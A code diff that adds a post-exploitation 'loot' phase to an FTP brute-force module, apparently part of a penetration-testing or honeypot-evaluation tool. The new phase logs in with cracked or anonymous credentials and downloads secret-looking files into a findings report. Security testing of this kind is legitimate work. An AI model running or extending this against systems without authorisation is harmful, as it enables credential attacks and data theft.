@@ -19,6 +19,7 @@ from attacker.attacks.common import (
     run_credential_bruteforce,
 )
 from attacker.attacks.honeypot import analyze_logins, detect_ftp, warn_if_suspected
+from attacker.attacks.post_exploit import ftp_post_exploit
 
 logger = logging.getLogger(__name__)
 
@@ -47,8 +48,10 @@ class FtpBruteforceReport:
     hydra_credentials_found: int = 0
     anonymous_connected: bool = False
     decoys_downloaded: int = 0
+    sensitive_files: int = 0
     honeypot_suspected: bool = False
     skipped_phases: list[str] = field(default_factory=list)
+    loot_findings: list[report_mod.ReportFinding] = field(default_factory=list)
     exit_code: int = 0
 
 
@@ -83,12 +86,23 @@ def _phase_anonymous(
         except ftplib.all_errors:
             pass
 
-    except (OSError, ftplib.all_errors) as exc:
+    except ftplib.all_errors as exc:  # already includes OSError
         log_lines.append(f"CONNECT -> FAIL ({exc})")
         logger.error("FTP connection failed: %s", exc)
 
     results.file("anonymous.txt").write_text("\n".join(log_lines), encoding="utf-8")
     return connected, decoys_downloaded
+
+
+def _select_loot_login(
+    found: list[tuple[str, str]], anonymous_connected: bool
+) -> tuple[str, str] | None:
+    """Pick the login used for the loot phase: cracked creds beat anonymous."""
+    if found:
+        return found[0]
+    if anonymous_connected:
+        return ("anonymous", "anonymous@example.com")
+    return None
 
 
 def run(
@@ -190,6 +204,38 @@ def run(
             )
         )
 
+    # Phase 3: post-exploitation — walk the tree and pull the secret-looking
+    # files with the best working login (cracked creds first, else anonymous).
+    loot_login = _select_loot_login(found, report.anonymous_connected)
+    if loot_login is not None:
+        loot_user, loot_pwd = loot_login
+        loot, downloaded = ftp_post_exploit(
+            config.target_host,
+            config.target_port,
+            loot_user,
+            loot_pwd,
+            verdict,
+            results,
+            timeout=config.ftp_timeout,
+        )
+        report.loot_findings = loot
+        # Genuine exposures only; placeholder/decoy downloads are info-level bait.
+        report.sensitive_files = sum(1 for f in loot if f.severity == "high")
+        rich.phases.append(
+            report_mod.ReportPhase(
+                "Post-exploitation",
+                "completed",
+                f"{downloaded} file(s) downloaded as {loot_user} "
+                f"({report.sensitive_files} genuine)",
+            )
+        )
+    else:
+        rich.phases.append(
+            report_mod.ReportPhase(
+                "Post-exploitation", "skipped", "no working login"
+            )
+        )
+
     report.honeypot_suspected = warn_if_suspected(verdict, logger)
 
     _populate_report(rich, config, report, verdict, found)
@@ -226,6 +272,7 @@ def _populate_report(
                 f"`anonymous` accepted at {report.target}",
             )
         )
+    rich.findings.extend(report.loot_findings)
     if rich.honeypot.suspected:
         rich.findings.append(
             report_mod.ReportFinding(
@@ -239,7 +286,7 @@ def _populate_report(
         "Login attempts": report.hydra_attempts,
         "Credentials cracked": report.hydra_credentials_found,
         "Anonymous login": "yes" if report.anonymous_connected else "no",
-        "Decoys downloaded": report.decoys_downloaded,
+        "Sensitive files downloaded": report.sensitive_files,
         "Honeypot suspected": "yes" if report.honeypot_suspected else "no",
         "Skipped phases": ", ".join(report.skipped_phases) or "none",
     }
